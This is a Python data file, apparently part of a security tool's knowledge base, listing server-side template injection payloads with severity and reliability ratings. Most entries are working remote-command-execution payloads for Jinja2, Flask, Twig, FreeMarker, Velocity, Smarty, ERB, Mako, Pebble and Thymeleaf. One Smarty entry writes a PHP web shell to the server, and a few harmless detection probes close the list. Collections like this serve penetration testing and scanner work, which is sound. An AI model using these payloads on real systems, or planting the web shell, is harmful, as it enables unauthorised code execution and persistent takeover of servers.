#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

SSTI to XSS Payloads
Server-Side Template Injection leading to XSS
"""

from ..models import PayloadEntry


SSTI_XSS_DATABASE = {
    # ===== JINJA2 SSTI =====
    "ssti_jinja_001": PayloadEntry(
        payload='{{config.__class__.__init__.__globals__["os"].popen("echo XSS").read()}}',
        contexts=["template_injection", "template"],
        tags=["ssti", "jinja2", "python"],
        severity="critical",
        cvss_score=9.5,
        description="Jinja2 SSTI RCE",
        reliability="high",
    ),
    "ssti_jinja_002": PayloadEntry(
        payload="{{''.__class__.__mro__[1].__subclasses__()}}",
        contexts=["template_injection", "template"],
        tags=["ssti", "jinja2", "python"],
        severity="critical",
        cvss_score=9.5,
        description="Jinja2 class exploration",
        reliability="high",
    ),
    "ssti_jinja_003": PayloadEntry(
        payload='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
        contexts=["template_injection", "template"],
        tags=["ssti", "jinja2", "flask"],
        severity="critical",
        cvss_score=9.5,
        description="Flask Jinja2 RCE",
        reliability="medium",
    ),
    # ===== TWIG SSTI =====
    "ssti_twig_001": PayloadEntry(
        payload='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        contexts=["template_injection", "template"],
        tags=["ssti", "twig", "php"],
        severity="critical",
        cvss_score=9.5,
        description="Twig SSTI RCE",
        reliability="medium",
    ),
    "ssti_twig_002": PayloadEntry(
        payload='{{["id"]|filter("system")}}',
        contexts=["template_injection", "template"],
        tags=["ssti", "twig", "php"],
        severity="critical",
        cvss_score=9.5,
        description="Twig filter RCE",
        reliability="medium",
    ),
    # ===== FREEMARKER SSTI =====
    "ssti_freemarker_001": PayloadEntry(
        payload='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        contexts=["template_injection", "template"],
        tags=["ssti", "freemarker", "java"],
        severity="critical",
        cvss_score=9.5,
        description="FreeMarker SSTI RCE",
        reliability="medium",
    ),
    # ===== VELOCITY SSTI =====
    "ssti_velocity_001": PayloadEntry(
        payload='#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")',
        contexts=["template_injection", "template"],
        tags=["ssti", "velocity", "java"],
        severity="critical",
        cvss_score=9.5,
        description="Velocity SSTI RCE",
        reliability="low",
    ),
    # ===== SMARTY SSTI =====
    "ssti_smarty_001": PayloadEntry(
        payload="{php}echo `id`;{/php}",
        contexts=["template_injection", "template"],
        tags=["ssti", "smarty", "php"],
        severity="critical",
        cvss_score=9.5,
        description="Smarty PHP tag",
        reliability="low",
    ),
    "ssti_smarty_002": PayloadEntry(
        payload="{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        contexts=["template_injection", "template"],
        tags=["ssti", "smarty", "php"],
        severity="critical",
        cvss_score=9.5,
        description="Smarty file write",
        reliability="low",
    ),
    # ===== ERB SSTI =====
    "ssti_erb_001": PayloadEntry(
        payload='<%= system("id") %>',
        contexts=["template_injection", "template"],
        tags=["ssti", "erb", "ruby"],
        severity="critical",
        cvss_score=9.5,
        description="ERB SSTI RCE",
        reliability="high",
    ),
    "ssti_erb_002": PayloadEntry(
        payload="<%= `id` %>",
        contexts=["template_injection", "template"],
        tags=["ssti", "erb", "ruby"],
        severity="critical",
        cvss_score=9.5,
        description="ERB backtick RCE",
        reliability="high",
    ),
    # ===== MAKO SSTI =====
    "ssti_mako_001": PayloadEntry(
        payload='<%import os%>${os.popen("id").read()}',
        contexts=["template_injection", "template"],
        tags=["ssti", "mako", "python"],
        severity="critical",
        cvss_score=9.5,
        description="Mako SSTI RCE",
        reliability="high",
    ),
    # ===== PEBBLE SSTI =====
    "ssti_pebble_001": PayloadEntry(
        payload='{{ variable.getClass().forName("java.lang.Runtime").getRuntime().exec("id") }}',
        contexts=["template_injection", "template"],
        tags=["ssti", "pebble", "java"],
        severity="critical",
        cvss_score=9.5,
        description="Pebble SSTI RCE",
        reliability="low",
    ),
    # ===== THYMELEAF SSTI =====
    "ssti_thymeleaf_001": PayloadEntry(
        payload='__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',
        contexts=["template_injection", "template"],
        tags=["ssti", "thymeleaf", "java"],
        severity="critical",
        cvss_score=9.5,
        description="Thymeleaf SSTI RCE",
        reliability="medium",
    ),
    # ===== DETECTION PAYLOADS =====
    "ssti_detect_001": PayloadEntry(
        payload="{{7*7}}",
        contexts=["template_injection", "template"],
        tags=["ssti", "detection"],
        severity="medium",
        cvss_score=5.0,
        description="SSTI detection 49",
        reliability="high",
    ),
    "ssti_detect_002": PayloadEntry(
        payload="${7*7}",
        contexts=["template_injection", "template"],
        tags=["ssti", "detection"],
        severity="medium",
        cvss_score=5.0,
        description="SSTI detection ${49}",
        reliability="high",
    ),
    "ssti_detect_003": PayloadEntry(
        payload="<%= 7*7 %>",
        contexts=["template_injection", "template"],
        tags=["ssti", "detection", "erb"],
        severity="medium",
        cvss_score=5.0,
        description="ERB detection 49",
        reliability="high",
    ),
    "ssti_detect_004": PayloadEntry(
        payload="${{7*7}}",
        contexts=["template_injection", "template"],
        tags=["ssti", "detection"],
        severity="medium",
        cvss_score=5.0,
        description="SSTI detection ${{49}}",
        reliability="high",
    ),
    "ssti_detect_005": PayloadEntry(
        payload="#{7*7}",
        contexts=["template_injection", "template"],
        tags=["ssti", "detection"],
        severity="medium",
        cvss_score=5.0,
        description="SSTI detection #{49}",
        reliability="high",
    ),
}

SSTI_XSS_TOTAL = len(SSTI_XSS_DATABASE)
